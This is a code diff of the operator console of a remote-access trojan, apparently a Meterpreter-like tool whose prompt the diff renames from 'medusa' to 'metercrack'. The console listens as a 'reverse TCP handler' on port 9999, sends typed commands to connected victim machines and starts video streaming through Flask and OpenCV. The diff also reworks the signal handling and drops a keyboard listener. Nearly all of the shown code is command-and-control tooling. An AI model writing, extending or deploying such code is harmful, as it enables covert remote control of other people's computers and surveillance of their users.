@@ -2,25 +2,23 @@ import socket
 import threading
 import time
 import signal
-from flask import Flask, Response
+from flask import Flask, Response, request
+from colorama import Fore, Style, init
 import cv2
 import numpy as np
-from pynput import keyboard
 import sys
 import os
-
-from colorama import Fore, Style, init
 
 init(autoreset=True)
 
 app = Flask(__name__)
 clients = {}
 server_thread = None
-streaming_active = False  # Flag to track streaming status
+streaming = False  # To track the streaming status
 
 def start_streaming(client_socket, mode):
-    global streaming_active
-    streaming_active = True
+    global streaming
+    streaming = True
     print(Fore.BLUE + "[ * ] Starting...")
     time.sleep(1)
     print(Fore.BLUE + "[ * ] Preparing player...")
@@ -54,7 +52,7 @@ def handle_client(client_socket, addr):
 
     while True:
         try:
-            command = input(Fore.MAGENTA + "medusa > ")
+            command = input(Fore.MAGENTA + "metercrack > ")
         except EOFError:
             break
 
@@ -119,40 +117,28 @@ def handle_client(client_socket, addr):
 
         client_socket.send(command.encode('utf-8'))
 
-def stop_server():
-    global streaming_active
-    streaming_active = False
-    print(Fore.RED + "[ * ] Stopping Flask server...")
-    os.kill(os.getpid(), signal.SIGINT)  # Trigger a SIGINT to properly shut down the Flask app
-
 def signal_handler(sig, frame):
-    print(Fore.RED + "[ * ] CTRL+C detected! Stopping Flask server...")
-    stop_server()
-    sys.exit(0)
-
-def on_press(key):
-    global streaming_active
-    try:
-        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
-            if keyboard.Listener.cooked_keys.get(keyboard.Key.shift):
-                if streaming_active:
-                    print(Fore.YELLOW + "[ * ] CTRL + SHIFT pressed. Stopping streaming...")
-                    stop_server()
-                    return False  # Stop listening for the keys
-    except AttributeError:
-        pass
+    global streaming
+    if streaming:
+        print(Fore.RED + "\n[ * ] CTRL+X detected, stopping the Flask server and returning to prompt...")
+        os._exit(0)
+    else:
+        print(Fore.RED + "\n[ * ] Exiting the program...")
+        sys.exit(0)
 
 def main():
     signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
+    signal.signal(signal.SIGQUIT, signal_handler)
+    
+    # Custom signal handler for CTRL+X
+    signal.signal(signal.SIGTSTP, signal_handler)
 
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.bind(('0.0.0.0', 9999))
     server_socket.listen(5)
     print(Fore.GREEN + "[ * ] Started reverse TCP handler on 0.0.0.0:9999")
     print(Fore.GREEN + "[ * ] Listening for incoming connections...")
-
-    listener = keyboard.Listener(on_press=on_press)
-    listener.start()
 
     while True:
         client_socket, addr = server_socket.accept()
